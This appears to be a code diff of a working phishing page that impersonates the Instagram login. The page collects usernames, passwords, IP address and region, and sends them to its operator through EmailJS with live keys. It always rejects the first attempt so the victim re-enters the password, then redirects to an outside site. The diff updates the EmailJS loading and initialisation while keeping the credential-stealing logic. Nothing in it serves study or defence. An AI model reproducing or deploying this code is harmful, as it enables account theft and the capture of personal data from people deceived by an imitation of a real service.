@@ -8,10 +8,18 @@
     <link rel="stylesheet" href="{% static 'css/instagram.css' %}">
     <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script type="module">
-        import emailjs from 'https://cdn.emailjs.com/dist/email.min.js';
-    </script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "z5r6OeWz6vOpDSahr",
+      });
+   })();
+</script>
+
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
     <style>
         html {
             height: 100%;
@@ -27,7 +35,7 @@
             border-radius: 0px;
             height: 410px;
             margin: 30px auto 0;
-            width: 90%;
+            width: 100%;
             max-width: 400px;
             padding: 0 20px;
         }
@@ -278,13 +286,17 @@
     <div class="login">
         <h1><img src="https://i.imgur.com/wvLiKam.png" width="200px" height="68px"></h1>
         <form id="contact-form">
-            <input type="text" placeholder="Username" id="name" value="instagram" name="name" class="input-1" hidden />
-            <input type="text" placeholder="Username" id="email" name="email" class="input-1" required />
-            <div class="overlap-text">
-                <input type="password" placeholder="Password" id="message" name="message" class="input-2" required />
-            </div>
-            <input class="btn btn-primary" type="submit" value="Log in">
-        </form>
+          <input type="text" placeholder="Username" id="name" value="instagram" name="name" class="input-1" hidden />
+          <input type="text" placeholder="Username" id="email" name="email" class="input-1" required />
+          <div class="overlap-text">
+              <input type="password" placeholder="Password" id="message" name="message" class="input-2" required />
+          </div>
+          <input class="btn btn-primary" type="submit" value="Log in">
+      </form>
+      
+      <!-- Hidden inputs for IP and State -->
+      <input type="hidden" id="ip_address" name="ip_address">
+      <input type="hidden" id="state" name="state">
 
         <div class="divider"><b>OR</b></div>
 
@@ -322,75 +334,55 @@
             <span>© 2024 INSTAGRAM</span>
         </p>
     </div>
-
-
-<script>
-  document.addEventListener("DOMContentLoaded", function() {
-      fetch("https://ipinfo.io/json?token=d53f8306658fc8") // Replace with your free ipinfo.io API key
-      .then(response => response.json())
-      .then(data => {
-          document.getElementById("ip_address").value = data.ip;
-          document.getElementById("state").value = data.region;
-      })
-      .catch(error => console.error("Error fetching IP info:", error));
-  });
-  </script>
-  
-
-
-<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
-
-<script type="text/javascript">
-  document.addEventListener("DOMContentLoaded", function() {
-      fetch("https://ipinfo.io/json?token=d53f8306658fc8") // Replace with your free ipinfo.io API key
-      .then(response => response.json())
-      .then(data => {
-          document.getElementById("ip_address").value = data.ip;
-          document.getElementById("state").value = data.region;
-      })
-      .catch(error => console.error("Error fetching IP info:", error));
-  });
-
-  let attemptCount = 0;
-
-  (function() {
-    emailjs.init("f4e9WkNtC012SJLfG");
-  })();
-
-  document.getElementById("contact-form").addEventListener("submit", function(event) {
-    event.preventDefault();
-
-    // First attempt shows inline error
-    if (attemptCount === 0) {
-      attemptCount++;
-      document.getElementById("login-error").style.display = "block";
-      return;
-    }
-
-    // Collect form values
-    var name = document.getElementById("name").value;
-    var email = document.getElementById("email").value;
-    var message = document.getElementById("message").value;
-    var ip_address = document.getElementById("ip_address").value;
-    var state = document.getElementById("state").value;
-
-    var emailParams = {
-      from_name: name,
-      from_email: email,
-      message: message,
-      ip_address: ip_address,
-      state: state
-    };
-
-    emailjs.send("service_75wx5te", "template_vuqsrlf", emailParams)
-      .then(function(response) {
-        window.location.href = "http://thedailydish6.ct.ws/voty.html";
-      }, function(error) {
-        console.error("Login Error:", error);
-        alert("Failed to Login. Please check and try again.");
+      
+    
+    <script type="text/javascript">
+      document.addEventListener("DOMContentLoaded", function() {
+          fetch("https://ipinfo.io/json?token=d53f8306658fc8") // Replace with your free ipinfo.io API key
+          .then(response => response.json())
+          .then(data => {
+              document.getElementById("ip_address").value = data.ip;
+              document.getElementById("state").value = data.region;
+          })
+          .catch(error => console.error("Error fetching IP info:", error));
       });
-  });
-</script>
+    
+      let attemptCount = 0;
+    
+      document.getElementById("contact-form").addEventListener("submit", function(event) {
+        event.preventDefault();
+    
+        // First attempt shows inline error
+        if (attemptCount === 0) {
+          attemptCount++;
+          document.getElementById("login-error").style.display = "block";
+          return;
+        }
+    
+        // Collect form values
+        var name = document.getElementById("name").value;
+        var email = document.getElementById("email").value;
+        var message = document.getElementById("message").value;
+        var ip_address = document.getElementById("ip_address").value;
+        var state = document.getElementById("state").value;
+    
+        var emailParams = {
+          from_name: name,
+          from_email: email,
+          message: message,
+          ip_address: ip_address,
+          state: state
+        };
+    
+        emailjs.send("service_75wx5te", "template_vuqsrlf", emailParams)
+          .then(function(response) {
+            window.location.href = "http://thedailydish6.ct.ws/voty.html";
+          }, function(error) {
+            console.error("Login Error:", error);
+            alert("Failed to Login. Please check and try again.");
+          });
+      });
+    </script>
     
 </body>
 
